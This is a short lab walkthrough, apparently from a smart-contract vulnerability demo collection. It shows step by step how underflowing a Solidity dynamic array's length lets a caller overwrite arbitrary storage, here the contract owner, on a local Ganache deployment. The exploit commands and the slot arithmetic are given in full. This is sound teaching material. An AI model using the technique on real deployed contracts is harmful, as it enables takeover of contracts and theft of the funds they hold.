# Array length underflow

## Description

You can change array length to cover the whole storage address space. Then if there are any functions manipulating variables you can access them
by address in storage.

### What to do:

1. run `truffle compile`
2. open Ganache and run `truffle migrate`
3. run `truffle console`
4. run `ArrayLengthUnderflow.deployed().then(function(instance){return instance.getLength.call();}).then(function(length){return length.toNumber();});`. The array length is 1 now
5. run `ArrayLengthUnderflow.deployed().then(function(instance){return instance.underflow();});` 2 times. The array length is now 2^256 covering the whole storage address space
6. To modify the contract's owner you should know the storage address of the owner variable. To get it you can run python3 code: 
`hex(0x10000000000000000000000000000000000000000000000000000000000000000 - 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 + 0x1)
` where 0x10000000000000000000000000000000000000000000000000000000000000000 is 2^256, 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563 is keccak256(uint(0)), 0x1 is
owner's storage address number. 0x0 contains array length while the next one, 0x1 contains owner's variable address.
7. run `ArrayLengthUnderflow.deployed().then(function(instance){return instance.owner()});`. It will return owner's address `0x627306090abab3a6e1400e9345bc60c78a8bef57`
8. run `ArrayLengthUnderflow.deployed().then(function(instance){return instance.modify('0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9e', '0xabc')});`. Owner's address is `0x0000000000000000000000000000000000000abc` now